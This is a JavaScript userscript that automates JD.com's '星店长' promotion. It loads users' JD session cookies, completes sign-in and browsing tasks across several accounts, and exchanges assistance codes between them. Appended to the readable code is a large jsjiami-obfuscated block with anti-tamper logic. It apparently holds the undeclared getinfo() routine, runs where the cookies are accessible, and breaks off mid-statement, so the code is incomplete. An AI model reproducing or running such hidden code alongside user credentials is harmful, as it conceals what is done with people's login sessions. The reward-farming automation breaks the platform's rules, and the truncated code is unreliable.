/*
星店长
Last Modified time: 2021-11-03 23:40
活动入口：京东APP首页-搜索-星店长。[活动地址](https://happy.m.jd.com/babelDiy/zjyw/3ugedFa7yA6NhxLN5gw2L3PF9sQC/index.html)
未实现功能：领3张券功能
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
================QuantumultX==================
[task_local]
#星店长
5 7,12,20 * * * https://raw.githubusercontent.com/ZFeng1005/MyScripts/jd_scripts/jd_star.js, tag=星店长, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jd_star.png, enabled=true
===================Loon==============
[Script]
cron "5 7,12,20 * * *" script-path=https://raw.githubusercontent.com/ZFeng1005/MyScripts/jd_scripts/jd_star.js, tag=星店长
===============Surge===============
[Script]
星店长 = type=cron,cronexp="5 7,12,20 * * *",wake-system=1,timeout=3600,script-path=https://raw.githubusercontent.com/ZFeng1005/MyScripts/jd_scripts/jd_star.js
====================================小火箭=============================
星店长 = type=cron,script-path=https://raw.githubusercontent.com/ZFeng1005/MyScripts/jd_scripts/jd_star.js, cronexpr="5 7,12,20 * * *", timeout=3600, enable=true
 */
const $ = new Env('星店长');
const { url } = require('inspector');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const JD_API_HOST = 'https://api.m.jd.com/';
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [],
    cookie = '',
    shareCodesArr = [];
let shareCodes='';let isLoginInfo={};let linkId="nUW_swWdzGTw9TREVAMBCw";let code='';
var ItemArr1=[];var ItemArr2=[];


if ($.isNode()) {
    Object.keys(jdCookieNode).forEach((item) => {
        cookiesArr.push(jdCookieNode[item])
    })
    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
    cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}

!(async () => {
    if (!cookiesArr[0]) {
        $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
        return;
    }
    for (let i = 0; i < cookiesArr.length; i++) {
        if (!cookiesArr[i]) {
            continue
        }
        cookie = cookiesArr[i];
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.isLogin = true;
        $.canHelp = true;
        $.nickName = '';
        message = '';
        await TotalBean();
        isLoginInfo[$.UserName]=$.isLogin;
        console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
        if (!$.isLogin) {
            $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
            if ($.isNode()) {
                await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
            }
            continue
        }
        await getUA()
        await getinfo()
        await main()
    }
    console.log(`\n********* 开始互助 *********\n`);
    for (let i = 0; i < cookiesArr.length; i++) {
      if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.canHelp = true;
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]);
      if (!isLoginInfo[$.UserName]) continue
      if ($.canHelp && (shareCodesArr && shareCodesArr.length)) {
        for (let j = 0; j < shareCodesArr.length && $.canHelp; j++) {
            console.log(`【${$.UserName}】去助力${shareCodesArr[j]}`)
            await help(shareCodesArr[j])
            await $.wait(3000)
            }
          }
        }
      }
})()
.catch((e) => {
        $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
        $.done();
    })

    async function main(){
        await starShopPageInfo();
        await $.wait(1000);
        console.log(`\n开始做签到任务`)
        await sign();
        await $.wait(1000);
        console.log(`\n开始做浏览会场任务`)
        await doTask1();
        await $.wait(1000);
        console.log(`\n开始做浏览品牌小店任务`)
        await doTask2();
    }

    function sign() {
        return new Promise(async resolve => {
          const body = {
            "taskType":"SIGN",
            "taskId":388,
            "linkId":`${linkId}`
          }
          $.post(taskUrl('apDoTask', body), (err, resp, data) => {
            try {
              if (err) {
                console.log(`${JSON.stringify(err)}`)
                console.log(`${$.name} API请求失败，请检查网路重试`)
              } else {
                if (data) {
                 data = JSON.parse(data);
                 //console.log(JSON.stringify(data))
                 if(data.success && data.code === 0){
                     console.log(`签到成功，获取热力值：5`)
                 }else{
                     console.log(data.errMsg);
                 }
                } else {
                  console.log(`京东服务器返回空数据`)
                }
              }
            } catch (e) {
              $.logErr(e, resp)
            } finally {
              resolve();
            }
          })
        })
      }

      function apTaskDetail1() {
        return new Promise(async resolve => {
          const body = {
            "taskType":"BROWSE_CHANNEL",
            "taskId":"395",
            "channel":"4",
            "linkId":`${linkId}`
          }
          $.post(taskUrl('apTaskDetail', body), (err, resp, data) => {
            try {
              if (err) {
                console.log(`${JSON.stringify(err)}`)
                console.log(`${$.name} API请求失败，请检查网路重试`)
              } else {
                if (data) {
                 data = JSON.parse(data);
                 code = data.code;
                 if(data.code === 0){
                    for(let item of data.data.taskItemList){
                        ItemArr1.push(item)
                    }
                    ItemArr1=[...new Set(ItemArr1)]
                 }else if(data.code === 2003){
                     return
                 }else{
                     console.log(errMsg)
                     return
                 }
                } else {
                  console.log(`京东服务器返回空数据`)
                  return
                }
              }
            } catch (e) {
              $.logErr(e, resp)
            } finally {
              resolve(data);
            }
          })
        })
      }

      function Taks1(itemId) {
        return new Promise(async resolve => {
          const body = {
            "taskType":"BROWSE_CHANNEL",
            "taskId":395,
            "channel":4,
            "linkId":`${linkId}`,
            "itemId":`${itemId}`
          }
          $.post(taskUrl('apDoTask', body), (err, resp, data) => {
            try {
              if (err) {
                console.log(`${JSON.stringify(err)}`)
                console.log(`${$.name} API请求失败，请检查网路重试`)
              } else {
                if (data) {
                 data = JSON.parse(data);
                 console.log(JSON.stringify(data))
                 if(data.success && !data.data.finish && data.code === 0){
                     console.log(`浏览成功，获得热爱值：10`)
                 }else{
                     console.log(data.errMsg)
                     code = data.code;
                 }
                } else {
                  console.log(`京东服务器返回空数据`)
                }
              }
            } catch (e) {
              $.logErr(e, resp)
            } finally {
              resolve();
            }
          })
        })
      }

      async function doTask1(){
        await apTaskDetail1();
        await $.wait(1000);
        if( ItemArr1 && ItemArr1.length){
          for( i = 0; i < 5; i++){
                console.log(`\n去浏览${ItemArr1[i].itemName}`)
                await Taks1(ItemArr1[i].itemId)
                await $.wait(2500);
            }
        }else{
           console.log(`任务已完成`);
           return
        }
      }

      function apTaskDetail2() {
        return new Promise(async resolve => {
          const body = {
            "taskType":"BROWSE_CHANNEL",
            "taskId":396,
            "channel":4,
            "linkId":`${linkId}`
          }
          $.post(taskUrl('apTaskDetail', body), (err, resp, data) => {
            try {
              if (err) {
                console.log(`${JSON.stringify(err)}`)
                console.log(`${$.name} API请求失败，请检查网路重试`)
              } else {
                if (data) {
                 data = JSON.parse(data);
                 //console.log(JSON.stringify(data))
                 if(data.code === 0){
                    for(let item2 of data.data.taskItemList){
                        ItemArr2.push(item2)
                    }
                    ItemArr2=[...new Set(ItemArr2)]
                    //console.log(ItemArr2);
                 }else{
                     console.log(data.errMsg)
                     return
                 }
                } else {
                  console.log(`京东服务器返回空数据`)
                }
              }
            } catch (e) {
              $.logErr(e, resp)
            } finally {
              resolve(data);
            }
          })
        })
      }

      function Taks2(itemId) {
        return new Promise(async resolve => {
          const body = {
            "taskType":"BROWSE_CHANNEL",
            "taskId":396,
            "channel":4,
            "linkId":`${linkId}`,
            "itemId":itemId
          }
          $.post(taskUrl('apDoTask', body), (err, resp, data) => {
            try {
              if (err) {
                console.log(`${JSON.stringify(err)}`)
                console.log(`${$.name} API请求失败，请检查网路重试`)
              } else {
                if (data) {
                 data = JSON.parse(data);
                 //console.log(JSON.stringify(data))
                 if(data.success && !data.data.finish && data.code === 0){
                    console.log(`浏览成功，获得热爱值：10`)
                  }else{
                    console.log(data.errMsg)
                    code = data.code; 
                }
                } else {
                  console.log(`京东服务器返回空数据`)
                }
              }
            } catch (e) {
              $.logErr(e, resp)
            } finally {
              resolve();
            }
          })
        })
      }

      async function doTask2(){
        await apTaskDetail2();
        if(ItemArr2 && ItemArr2.length){
            for( i = 0; i < 5; i++ ){
              console.log(`\n去浏览${ItemArr2[i].itemName}店铺`)
              await Taks2(ItemArr2[i].itemId)
              await $.wait(2500);
              if(code === 2005)break
            }
           }else{
               console.log(`任务已完成`);
               return
           }
      }

      function starShopPageInfo() {
        return new Promise(async (resolve) => {
            let options = {
              url: `https://api.m.jd.com/?functionId=starShopPageInfo&body=%7B%22taskId%22%3A%22397%22%2C%22encryptionPin%22%3A%22${shareCodes}%22%2C%22linkId%22%3A%22nUW_swWdzGTw9TREVAMBCw%22%7D&_t=1635766527031&appid=activities_platform`,
              headers: {
                "Host": "api.m.jd.com",
                "Connection": "keep-alive",
                "Accept": "application/json, text/plain, */*",
                "Origin": "https://pro.m.jd.com",
                "User-Agent": $.UA,
                "Sec-Fetch-Mode": "cors",
                "X-Requested-With": "com.jingdong.app.mall",
                "Sec-Fetch-Site": "same-site",
                "Referer": "https://pro.m.jd.com/mall/active/3GpvvutHU8PsMmvTXqYya3PQNTG3/index.html?activityId=nUW_swWdzGTw9TREVAMBCw&encryptPin=SfGznooJLloOJOfIzApQxA&taskId=397&taskId=397&tttparams=jkMnnhUeyJnTGF0IjoiMzguODg4NzIiLCJnTG5nIjoiMTE1LjUxNDI4IiwiZ3BzX2FyZWEiOiIwXzBfMF8wIiwibGF0IjowLCJsbmciOjAsIm1vZGVsIjoiTWk5IFBybyA1RyIsInByc3RhdGUiOiIwIiwidW5fYXJlYSI6IjVfMTk5XzUzODY1XzUzODcyIn70%3D&un_area=5_199_53865_53872",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
                "Cookie": cookie,
              }
            }
            $.get(options, async (err, resp, data) => {
          try {
            if (err) {
              console.log(`${JSON.stringify(err)}`)
              console.log(`initateCoinDozer API请求失败，请检查网路重试`)
            } else {
             if(data){
              data = JSON.parse(data);
              //console.log(JSON.stringify(data));
              if (!data.data && !data.code === 0) {
                console.log(`活动太火爆啦~`)
              } else {
                console.log(`【京东账号${$.index}】${$.UserName}的${$.name}互助码为：${data.data.encryptPin}\n`)
                console.log(`您当前的热爱值为：${data.data.currentGoodRoleValue}`)
                shareCodesArr.push(data.data.encryptPin)
              }
               }else{
                 console.log(JSON.stringify(data));
                 return
             }
           }
          } catch (e) {
            $.logErr(e, resp);
          } finally {
            resolve();
          }
        });
      });
    }

    function help(inviteCode) {
      return new Promise(async (resolve) => {
        let options = {
          url: `https://api.m.jd.com/?functionId=starShopPageInfo&body=%7B%22taskId%22%3A%22397%22%2C%22encryptionPin%22%3A%22${inviteCode}%22%2C%22linkId%22%3A%22nUW_swWdzGTw9TREVAMBCw%22%7D&_t=1635766527031&appid=activities_platform`,
          headers: {
            "Host": "api.m.jd.com",
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://pro.m.jd.com",
            "User-Agent": $.UA,
            "Sec-Fetch-Mode": "cors",
            "X-Requested-With": "com.jingdong.app.mall",
            "Sec-Fetch-Site": "same-site",
            "Referer": "https://pro.m.jd.com/mall/active/3GpvvutHU8PsMmvTXqYya3PQNTG3/index.html?activityId=nUW_swWdzGTw9TREVAMBCw&encryptPin=SfGznooJLloOJOfIzApQxA&taskId=397&taskId=397&tttparams=jkMnnhUeyJnTGF0IjoiMzguODg4NzIiLCJnTG5nIjoiMTE1LjUxNDI4IiwiZ3BzX2FyZWEiOiIwXzBfMF8wIiwibGF0IjowLCJsbmciOjAsIm1vZGVsIjoiTWk5IFBybyA1RyIsInByc3RhdGUiOiIwIiwidW5fYXJlYSI6IjVfMTk5XzUzODY1XzUzODcyIn70%3D&un_area=5_199_53865_53872",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": cookie,
          }
        }
        $.get(options, async (err, resp, data) => {
          try {
            if (err) {
              console.log(`${JSON.stringify(err)}`)
              console.log(`initateCoinDozer API请求失败，请检查网路重试`)
            } else {
             if(data){
              data = JSON.parse(data);
              //console.log(JSON.stringify(data));
              if (!data.data && !data.code === 0) {
                console.log(`活动太火爆啦~`)
              } else {
                if(data && data.success){
                  console.log(`助力成功✨`)
                }else{
                  console.log(JSON.stringify(data));
                }
              }
             }else{
               console.log(`京东服务器返回空数据`)
             }
            }
          } catch (e) {
            $.logErr(e, resp);
          } finally {
            resolve();
          }
        });
      });
    }

function TotalBean() {
    return new Promise(async resolve => {
        const options = {
            "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
            "headers": {
                "Accept": "application/json,text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-cn",
                "Connection": "keep-alive",
                "Cookie": cookie,
                "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`)
                    console.log(`${$.name} API请求失败，请检查网路重试`)
                } else {
                    if (data) {
                        data = JSON.parse(data);
                        if (data["retcode"] === 13) {
                            $.isLogin = false; //cookie过期
                            return;
                        }
                        if (data["retcode"] === 0) {
                            $.nickName = (data["base"] && data["base"].nickname) || $.UserName;
                        } else {
                            $.nickName = $.UserName;
                        }
                    } else {
                        console.log(`京东服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e, resp)
            } finally {
                resolve();
            }
        })
    })
}

function taskUrl(function_id, body) {
    return {
      "url": `${JD_API_HOST}`,
      body: `functionId=${function_id}&body=${encodeURIComponent(JSON.stringify(body))}&_t=${Date.now()}}&appid=activities_platform`,
      headers: {
        "Host": "api.m.jd.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://pro.m.jd.com",
        "User-Agent": $.UA,
        "Sec-Fetch-Mode": "cors",
        "X-Requested-With": "com.jingdong.app.mall",
        "Sec-Fetch-Site": "same-site",
        "Referer": "https://pro.m.jd.com/mall/active/3GpvvutHU8PsMmvTXqYya3PQNTG3/index.html?activityId=nUW_swWdzGTw9TREVAMBCw&encryptPin=SfGznooJLloOJOfIzApQxA&taskId=397&taskId=397&tttparams=jkMnnhUeyJnTGF0IjoiMzguODg4NzIiLCJnTG5nIjoiMTE1LjUxNDI4IiwiZ3BzX2FyZWEiOiIwXzBfMF8wIiwibGF0IjowLCJsbmciOjAsIm1vZGVsIjoiTWk5IFBybyA1RyIsInByc3RhdGUiOiIwIiwidW5fYXJlYSI6IjVfMTk5XzUzODY1XzUzODcyIn70%3D&un_area=5_199_53865_53872",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookie,
      }
    }
  }
  async function getUA(){
    $.UA = `jdapp;iPhone;10.2.2;14.3;${randomString(40)};M/5.0;network/wifi;ADID/;model/iPhone12,1;addressid/4199175193;appBuild/167863;jdSupportDarkMode/0;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1;`
  }
function randomString(e) {
  e = e || 32;
  let t = "abcdef0123456789", a = t.length, n = "";
  for (let i = 0; i < e; i++)
    n += t.charAt(Math.floor(Math.random() * a));
  return n
}

function safeGet(data) {
    try {
        if (typeof JSON.parse(data) == "object") {
            return true;
        }
    } catch (e) {
        console.log(e);
        console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
        return false;
    }
}

function jsonParse(str) {
    if (typeof str == "string") {
        try {
            return JSON.parse(str);
        } catch (e) {
            console.log(e);
            $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
            return [];
        }
    }
}
var _0xoda='jsjiami.com.v6',_0x3683=[_0xoda,'wp53LsKpw60=','wr5ZOcKgw6w=','ZcKxU8OJwos=','wqbDhsOldMK8','wq7Chld3w4cU','w6RdQMKFQw==','w4vCtl7CpWY=','w6vCnMOhwrrDjw==','wrfCu0pLw78=','CiDCkcKRVA==','BMKHH1kB','XjnDucOywqM=','wpbCg2/CicKFDsOXwrdM','VcOQAX55','w4XDocOOVzkBw5I=','w5PCicOIwqjDvA==','w4MGASjDlcOzworCu8KR','BCAbZ8K+','w45rYcKBQg==','cx3ClEA=','wrZrwpvDlmA=','aH7DmMKnCsK9','w7JnYsK+aQ==','a8KHfcOnwq7Ciw==','BzLCpQrCgg==','TihKw4sfw4DCrWTCmVs=','AyXCuDg=','McOSwrPCsULCkw==','O8KNH2I=','TcOfHHJ/w6jCuMOJLg==','w7Q8AijDuQ==','dCVJwogw','w4VcGSXClcO3wozCsA==','JcKGCn54w4nDjMKlO2s=','dRxDw5Qg','w6DCglnClXU=','w5gXHhTDlQ==','w7PCnMOlwpXDiA==','wqjCrnJ6w5M=','UsO2N1V3','wq14JMKRw7E=','awJT','wqNwwrTCi8KE','JnDCkifCng==','HGwdwpkP','P8KCLkkS','Q0E+wo8r','EQ4VNcOd','T8KbTsOwwqk=','w49Wd8KcUw==','cnXCtSPCow==','wqUwT8OpZA==','dMKvw4LChcKc','wrbDpnFDHA==','N0U/wqQ9','aARqQGE=','C2s/wpcE','wqbDncOpXsK8','bCXDjsO6WQ==','wq/CtE7CucKP','wpoRUA==','w792UsKeZw==','w6XCicOtw4IS','I8KJwqTDqsOs','w77CukHCgUg=','S3PDgDvCnkAq','A0A3wooB','d2XDjcKLFsKow5M8Jw==','I8KCG209','wqrDhHZhJQ==','YRREw4ME','wpQiScKxbA==','wr50wobDmFQ=','El3CugHCoA==','LBXCgAXCpQ==','fcKyQ8Okwpo=','IXQLwrYt','wr7DhcO1WcKt','TTDDocOFwpw=','VDDDr8OtSA==','wpPCk3pAw6I=','exR1c3I=','VsKSUMOQwos=','McKrwo3DtsOJ','a8KEUcODwpQ=','w4XDnUnDg8OO','w4MXFDjDgw==','c2EvwrUu','REkowqAk','wpLClnTClA==','woHDksOkXcK8','w6LDh3HDusOf','cD7CtVsS','YBpXw6UewpI=','aSXDgsOabTA=','f8KwSMOTwo0=','wrg8XMOoWg==','dMKywqnDrnc=','LwfCl1BBV0k8eMOkOcOr','dikFLcKKw4/Co8KywpMG','B0FhwrE=','cDd7VFM=','wovCk3nCgcKO','XntUw4jDig==','JAUN','UWsPwqsn','R0JVw4/Diw==','Rj54w4kq','dB3Cj0ca','BQjCq8Kscg==','wrXCiFlG','wr8Lw67DnMK0Iw==','DMK+wqDDgcOswpM=','TcKbY8OIwq8=','ZsKYc8KMwrHDl8Knc8KdCG80','b3TDmsKSVcKuw5YzKH4=','FcKjwqvCtg==','wrYVw6jDjMKT','wrE0w7DDlMKD','w5jDtsODYTk=','XXjDusKAAg==','Yi/DkQ==','wqzCqsKtw4l1','woJdJsKQ','w6rCv8Odw6k2','YUwjwpIE','WBNow6Yd','fUPCvjjCqw==','wo/Cojk4woApwqjCn07Do8KH','RsKuw6nChsK7','AxjChBdAFUJ3Y8KpZsKmwqIuXy4XDMKyG3sFw6h7wrTCk3rCnHbDpsO2w6fCuDpww7omdQclwrQ/DcOawr8VYl9Sw6zCqj3DjsO0fHpbwpAJOCPDpD9PeApkNRNjM3wgPgkRw5ZBw5jDq8OcfGZtHwshRi/Cn8KWFnQdbcKraMKXQsKyMMK4dg7Ds2fCsMOHw4UGRwcvC8KPLcONwoFWwq0xw43CtyvCgcOSAnfDtiXCs1wuwrQ1w7XCm8OfLB8pwqDDuV8XwrPCt8O7wpIQwoDChBvClcKrwpU=','YRHCrmAH','NcO0wpHChlI=','dMO5EHhy','R8KJw7XCq8KE','TGfDjgzCrg==','wph0B8KDw6k=','woNmwovDjlU=','w6clFTXDsw==','wrvCncKRw5R6','aCTDi8O8ag==','ey/Dnw==','wpUAUMOsbcOswpjDhTfCtsOpRxrCoGsvwp3DhsK9LETCp8OHwqzDjTHDg8KJwoXDscORw4kvw4wAwoXDhsKac1vCisODw5gZbW0Hw4lgw7EIO1XCu8KHDcKHwrZ1NcKCFT53wqPDkWbDuk8rw6jDiMOLB8OfZ2/Dm8Ks','w4/CsWfCrEU=','w5fDhcO5dDk=','O8OGwoDClkE=','w7LDpWfDjMOr','w6kZEALDiQ==','B8K0H3YF','VMKJYsOHwrA=','XUMkwrsi','Q3luw5XDgg==','AsOwwoLCnXQ=','w53ClkgHw5A=','w6zCqcOLw6w=','csK7w5vDtcKZEg==','DgkuR8K3','VmTDjW0=','w5wXHSbDj8O8','IzzCpj1O','wo4ESMO1ag==','B8OjwpzDnw==','b2LCtEc=','fncCw7M=','w6zCqcOLw68=','w5zCkMOYw6sF','O8KRA1ww','cDjDicONeg==','civDjMOr','wpIIw6U=','M19h','wplTKMKhw7k3','BXPCsTfCmQ==','w4LCk3oDw4I=','wrrCpEN1w4Y=','cCXDjMOywrnDng==','YmLDizzCtw==','wpBRCMKcw6Y=','ewbDrcOewp0=','wqXDtkNICA==','dsKEbMOywrY=','WQtLLEbCsxJ3w45s','NcOBwprCiGM=','w5zCucOQwq3Dog==','VjjDizvDlVE2Aw==','dcK7w5DDosOAG8OBLMOAWQ==','DxvCkg==','TCvCqUc5','BzXCg8KTcQ==','AQYrDcO6','csK6YMObwpY=','XUZWw7vDvw==','w4rDgnPDusON','EmHCqg==','jsxjFQiami.cotmMkdb.Tv6uKrNIrM=='];(function(_0x29710a,_0x1cc9a8,_0x1e7e1b){var _0x21873b=function(_0xdc2147,_0x2c2b63,_0x2d83ae,_0x3a892b,_0x5201de){_0x2c2b63=_0x2c2b63>>0x8,_0x5201de='po';var _0x4d421d='shift',_0x4214d7='push';if(_0x2c2b63<_0xdc2147){while(--_0xdc2147){_0x3a892b=_0x29710a[_0x4d421d]();if(_0x2c2b63===_0xdc2147){_0x2c2b63=_0x3a892b;_0x2d83ae=_0x29710a[_0x5201de+'p']();}else if(_0x2c2b63&&_0x2d83ae['replace'](/[xFQtMkdbTuKrNIrM=]/g,'')===_0x2c2b63){_0x29710a[_0x4214d7](_0x3a892b);}}_0x29710a[_0x4214d7](_0x29710a[_0x4d421d]());}return 0xb4758;};var _0x5c68db=function(){var _0x5cb29f={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x357cf9,_0x53a079,_0xc6496,_0x371b35){_0x371b35=_0x371b35||{};var _0x2b73a3=_0x53a079+'='+_0xc6496;var _0x53de43=0x0;for(var _0x53de43=0x0,_0x4a6249=_0x357cf9['length'];_0x53de43<_0x4a6249;_0x53de43++){var _0x231474=_0x357cf9[_0x53de43];_0x2b73a3+=';\x20'+_0x231474;var _0x295829=_0x357cf9[_0x231474];_0x357cf9['push'](_0x295829);_0x4a6249=_0x357cf9['length'];if(_0x295829!==!![]){_0x2b73a3+='='+_0x295829;}}_0x371b35['cookie']=_0x2b73a3;},'removeCookie':function(){return'dev';},'getCookie':function(_0x5e1e9d,_0xd33e7b){_0x5e1e9d=_0x5e1e9d||function(_0xd6926b){return _0xd6926b;};var _0x4cb600=_0x5e1e9d(new RegExp('(?:^|;\x20)'+_0xd33e7b['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x3bb175=typeof _0xoda=='undefined'?'undefined':_0xoda,_0x4d2657=_0x3bb175['split'](''),_0x41001f=_0x4d2657['length'],_0x199dc7=_0x41001f-0xe,_0x5a6e08;while(_0x5a6e08=_0x4d2657['pop']()){_0x41001f&&(_0x199dc7+=_0x5a6e08['charCodeAt']());}var _0x48a953=function(_0x4a7063,_0x4b4742,_0x5942fd){_0x4a7063(++_0x4b4742,_0x5942fd);};_0x199dc7^-_0x41001f===-0x524&&(_0x5a6e08=_0x199dc7)&&_0x48a953(_0x21873b,_0x1cc9a8,_0x1e7e1b);return _0x5a6e08>>0x2===0x14b&&_0x4cb600?decodeURIComponent(_0x4cb600[0x1]):undefined;}};var _0x1a2e91=function(){var _0x4abac7=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4abac7['test'](_0x5cb29f['removeCookie']['toString']());};_0x5cb29f['updateCookie']=_0x1a2e91;var _0x4ec023='';var _0x1dc6b6=_0x5cb29f['updateCookie']();if(!_0x1dc6b6){_0x5cb29f['setCookie'](['*'],'counter',0x1);}else if(_0x1dc6b6){_0x4ec023=_0x5cb29f['getCookie'](null,'counter');}else{_0x5cb29f['removeCookie']();}};_0x5c68db();}(_0x3683,0x13f,0x13f00));var _0x5589=function(_0x692208,_0x443e4d){_0x692208=~~'0x'['concat'](_0x692208);var _0x43581c=_0x3683[_0x692208];if(_0x5589['rtVjjP']===undefined){(function(){var _0xc2da64=function(){var _0x17db6d;try{_0x17db6d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x57ec7f){_0x17db6d=window;}return _0x17db6d;};var _0x36e13c=_0xc2da64();var _0x5dfd4a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x36e13c['atob']||(_0x36e13c['atob']=function(_0x246e34){var _0x3e09fc=String(_0x246e34)['replace'](/=+$/,'');for(var _0xe3d1f7=0x0,_0x8644fa,_0xc41ac0,_0x29c21d=0x0,_0x59ebc7='';_0xc41ac0=_0x3e09fc['charAt'](_0x29c21d++);~_0xc41ac0&&(_0x8644fa=_0xe3d1f7%0x4?_0x8644fa*0x40+_0xc41ac0:_0xc41ac0,_0xe3d1f7++%0x4)?_0x59ebc7+=String['fromCharCode'](0xff&_0x8644fa>>(-0x2*_0xe3d1f7&0x6)):0x0){_0xc41ac0=_0x5dfd4a['indexOf'](_0xc41ac0);}return _0x59ebc7;});}());var _0x420373=function(_0x819f4b,_0x443e4d){var _0x469178=[],_0x539491=0x0,_0x5d7a5a,_0x25089e='',_0x4472c9='';_0x819f4b=atob(_0x819f4b);for(var _0x41d942=0x0,_0x4fe450=_0x819f4b['length'];_0x41d942<_0x4fe450;_0x41d942++){_0x4472c9+='%'+('00'+_0x819f4b['charCodeAt'](_0x41d942)['toString'](0x10))['slice'](-0x2);}_0x819f4b=decodeURIComponent(_0x4472c9);for(var _0x3068fe=0x0;_0x3068fe<0x100;_0x3068fe++){_0x469178[_0x3068fe]=_0x3068fe;}for(_0x3068fe=0x0;_0x3068fe<0x100;_0x3068fe++){_0x539491=(_0x539491+_0x469178[_0x3068fe]+_0x443e4d['charCodeAt'](_0x3068fe%_0x443e4d['length']))%0x100;_0x5d7a5a=_0x469178[_0x3068fe];_0x469178[_0x3068fe]=_0x469178[_0x539491];_0x469178[_0x539491]=_0x5d7a5a;}_0x3068fe=0x0;_0x539491=0x0;for(var _0x99da65=0x0;_0x99da65<_0x819f4b['length'];_0x99da65++){_0x3068fe=(_0x3068fe+0x1)%0x100;_0x539491=(_0x539491+_0x469178[_0x3068fe])%0x100;_0x5d7a5a=_0x469178[_0x3068fe];_0x469178[_0x3068fe]=_0x469178[_0x539491];_0x469178[_0x539491]=_0x5d7a5a;_0x25089e+=String['fromCharCode'](_0x819f4b['charCodeAt'](_0x99da65)^_0x469178[(_0x469178[_0x3068fe]+_0x469178[_0x539491])%0x100]);}return _0x25089e;};_0x5589['cdVNwW']=_0x420373;_0x5589['LdaoDh']={};_0x5589['rtVjjP']=!![];}var _0x317ece=_0x5589['LdaoDh'][_0x692208];if(_0x317ece===undefined){if(_0x5589['tUQKsD']===undefined){var _0x46cef2=function(_0x1640f7){this['OqgYVr']=_0x1640f7;this['TEHNcN']=[0x1,0x0,0x0];this['nfDEQp']=function(){return'newState';};this['ptMKOe']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['VQDZvE']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x46cef2['prototype']['TqaOKa']=function(){var _0x5ad1b7=new RegExp(this['ptMKOe']+this['VQDZvE']);var _0x3c4e9c=_0x5ad1b7['test'](this['nfDEQp']['toString']())?--this['TEHNcN'][0x1]:--this['TEHNcN'][0x0];return this['VeUVUZ'](_0x3c4e9c);};_0x46cef2['prototype']['VeUVUZ']=function(_0x47acd0){if(!Boolean(~_0x47acd0)){return _0x47acd0;}return this['qWgKrb'](this['OqgYVr']);};_0x46cef2['prototype']['qWgKrb']=function(_0x40d429){for(var _0xeea4d7=0x0,_0x4e4365=this['TEHNcN']['length'];_0xeea4d7<_0x4e4365;_0xeea4d7++){this['TEHNcN']['push'](Math['round'](Math['random']()));_0x4e4365=this['TEHNcN']['length'];}return _0x40d429(this['TEHNcN'][0x0]);};new 